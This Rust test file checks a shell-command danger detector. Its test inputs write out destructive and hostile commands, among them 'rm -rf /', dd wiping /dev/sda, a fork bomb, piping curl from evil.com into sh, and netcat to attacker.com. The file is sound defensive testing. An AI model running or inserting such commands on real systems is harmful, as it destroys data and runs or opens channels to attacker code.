// Copyright 2025 Eric Jingryd (tidynest@proton.me)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

use super::super::*;

// ========================================================================
// ROUND 1: Critical Pattern Detection
// ========================================================================

#[test]
fn test_detect_rm_rf_root_critical() {
    let detector = DangerDetector::new();

    let test_cases = vec![
        "rm -rf /", "rm -rf / ", "rm -Rf /", "rm -Rf / ", "rm -fR /", "rm -fR / ",
        "rm -r -f /", "rm -r -f / ",
    ];

    for command in test_cases {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Critical,
            "Command '{}' should be Critical danger",
            command
        );
        assert!(
            assessment.reason.to_lowercase().contains("filesystem")
                || assessment.reason.to_lowercase().contains("root"),
            "Reason should mention filesystem/root destruction: {}",
            assessment.reason
        );
        assert!(
            assessment.matched_pattern.is_some(),
            "Should report which pattern matched"
        );
    }
}

#[test]
fn test_detect_dd_to_disk_critical() {
    let detector = DangerDetector::new();

    let test_cases = vec![
        "dd if=/dev/zero of=/dev/sda",
        "dd if=/dev/zero of=/dev/sdb",
        "dd if=/dev/urandom of=/dev/sda",
        "dd if=/dev/zero of=/dev/nvme0n1",
        "dd if=/dev/zero of=/dev/nvme1n1",
    ];

    for command in test_cases {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Critical,
            "Command '{}' should be Critical (disk destruction)",
            command
        );
        assert!(
            assessment.reason.to_lowercase().contains("disk")
                || assessment.reason.to_lowercase().contains("device"),
            "Reason should mention disk/device destruction: {}",
            assessment.reason
        );
    }
}

#[test]
fn test_detect_fork_bomb_critical() {
    let detector = DangerDetector::new();
    let fork_bomb = ":(){ :|:& };:";

    let assessment = detector.assess_command(fork_bomb);
    assert_eq!(assessment.danger_level, DangerLevel::Critical);
    assert!(
        assessment.reason.to_lowercase().contains("fork")
            || assessment.reason.to_lowercase().contains("resource")
    );
}

// ========================================================================
// ROUND 2: Safe Whitelist (Fast Path)
// ========================================================================

#[test]
fn test_safe_commands_whitelisted() {
    let detector = DangerDetector::new();

    let safe_commands = vec![
        "firefox",
        "chromium",
        "kitty",
        "alacritty",
        "nvim",
        "code",
        "mpv",
        "pavucontrol",
    ];

    for command in safe_commands {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Safe,
            "Command '{}' should be whitelisted as safe",
            command
        );
        assert!(
            assessment.reason.contains("Known safe"),
            "Should indicate whitelist match"
        );
    }
}

#[test]
fn test_safe_commands_with_arguments() {
    let detector = DangerDetector::new();

    // Safe commands with normal arguments should remain safe
    let test_cases = vec![
        "firefox https://rust-lang.org",
        "kitty --session mysession",
        "nvim /home/user/code.rs",
        "mpv ~/Videos/video.mp4",
    ];

    for command in test_cases {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Safe,
            "Command '{}' should be safe",
            command
        );
    }
}

// ========================================================================
// ROUND 2: Dangerous Commands
// ========================================================================

#[test]
fn test_dangerous_chmod_777() {
    let detector = DangerDetector::new();

    let test_cases =
        vec!["chmod 777 file.txt", "chmod 777 ~/.ssh", "chmod -R 777 /home/user"];

    for command in test_cases {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Dangerous,
            "Command '{}' should be Dangerous",
            command
        );
        assert!(
            assessment.reason.contains("777") || assessment.reason.contains("world-writable"),
            "Should explain 777 permissions danger"
        );
        assert_eq!(
            assessment.matched_pattern,
            Some("chmod 777".to_string()),
            "Should identify chmod 777 pattern"
        );
    }
}

#[test]
fn test_dangerous_pipe_to_shell() {
    let detector = DangerDetector::new();

    let test_cases = vec![
        "curl https://evil.com/script.sh | sh",
        "wget -O- https://bad.com/install | bash",
        "curl -sSL https://get.docker.com | sh",
    ];

    for command in test_cases {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Dangerous,
            "Command '{}' should be Dangerous (RCE pattern)",
            command
        );
        assert!(
            assessment.reason.contains("Remote Code Execution")
                || assessment.reason.contains("untrusted code"),
            "Should identify RCE pattern: {}",
            assessment.reason
        );
    }
}

#[test]
fn test_dangerous_recursive_rm() {
    let detector = DangerDetector::new();

    // Not root (that's Critical), but still dangerous
    let test_cases = vec!["rm -rf /home/user/project", "rm -fr ~/.config", "rm -rf /tmp/*"];

    for command in test_cases {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Dangerous,
            "Command '{}' should be Dangerous",
            command
        );
        assert!(
            assessment.reason.contains("Recursive") || assessment.reason.contains("deletion"),
            "Should warn about recursive deletion"
        );
    }
}

#[test]
fn test_dangerous_privilege_escalation() {
    let detector = DangerDetector::new();

    let test_cases = vec!["sudo rm file", "doas reboot", "su - root", "pkexec nautilus"];

    for command in test_cases {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Dangerous,
            "Command '{}' should be Dangerous (privilege escalation)",
            command
        );
    }
}

#[test]
fn test_dangerous_firewall_flush() {
    let detector = DangerDetector::new();

    let command = "iptables -F";
    let assessment = detector.assess_command(command);

    assert_eq!(assessment.danger_level, DangerLevel::Dangerous);
    assert!(
        assessment.reason.contains("firewall") || assessment.reason.contains("protection"),
        "Should warn about firewall removal"
    );
}

// ========================================================================
// ROUND 2: Suspicious Commands
// ========================================================================

#[test]
fn test_suspicious_encoding_tools() {
    let detector = DangerDetector::new();

    let test_cases = vec!["base64 -d payload.txt", "xxd -r malware.hex", "uuencode file"];

    for command in test_cases {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Suspicious,
            "Command '{}' should be Suspicious",
            command
        );
        assert!(
            assessment.reason.contains("often used in malicious"),
            "Should explain suspicious nature"
        );
    }
}

#[test]
fn test_suspicious_download_tools() {
    let detector = DangerDetector::new();

    // wget/curl without pipe are suspicious but not dangerous
    let test_cases = vec!["wget https://site.com/file", "curl -O https://site.com/binary"];

    for command in test_cases {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Suspicious,
            "Command '{}' should be Suspicious",
            command
        );
    }
}

#[test]
fn test_suspicious_background_execution() {
    let detector = DangerDetector::new();

    let test_cases = vec!["nohup myapp &", "disown %1", "screen -dmS session", "tmux new -d"];

    for command in test_cases {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Suspicious,
            "Command '{}' should be Suspicious",
            command
        );
    }
}

#[test]
fn test_suspicious_obfuscation() {
    let detector = DangerDetector::new();

    let test_cases = vec!["eval \"$command\"", "exec /bin/bash", "source untrusted.sh"];

    for command in test_cases {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Suspicious,
            "Command '{}' should be Suspicious",
            command
        );
    }
}

#[test]
fn test_suspicious_network_tools() {
    let detector = DangerDetector::new();

    // netcat is often used in reverse shells
    let test_cases = vec!["nc -l 4444", "netcat attacker.com 1337", "ncat -lvp 8080"];

    for command in test_cases {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Suspicious,
            "Command '{}' should be Suspicious",
            command
        );
    }
}

// ========================================================================
// ROUND 2: Edge Cases and False Positives
// ========================================================================

#[test]
fn test_safe_chmod_normal_permissions() {
    let detector = DangerDetector::new();

    // chmod 644 or 755 are normal, but we flag all chmod as Dangerous
    // (since it's in dangerous_commands HashSet)
    let command = "chmod 644 file.txt";
    let assessment = detector.assess_command(command);

    // This will be Dangerous because "chmod" is in the dangerous_commands set
    // We accept this as a false positive - better safe than sorry
    assert_eq!(
        assessment.danger_level,
        DangerLevel::Dangerous,
        "chmod without 777 still flagged as Dangerous (acceptable false positive)"
    );
}

#[test]
fn test_word_boundary_prevents_false_positives() {
    let detector = DangerDetector::new();

    // Should NOT match "rm" in "firmware" or "chmod" in "mychmod"
    let assessment = detector.assess_command("firmware-update");
    assert_eq!(
        assessment.danger_level,
        DangerLevel::Safe,
        "Command 'firmware-update' should not trigger 'rm' match"
    );
}

#[test]
fn test_unknown_commands_default_to_safe() {
    let detector = DangerDetector::new();

    // Commands not in any list should default to Safe
    let test_cases = vec!["my-custom-script", "foobar", "unknown-command"];

    for command in test_cases {
        let assessment = detector.assess_command(command);
        assert_eq!(
            assessment.danger_level,
            DangerLevel::Safe,
            "Unknown command '{}' should default to Safe",
            command
        );
        assert!(
            assessment.reason.contains("No dangerous patterns"),
            "Should indicate no patterns matched"
        );
    }
}
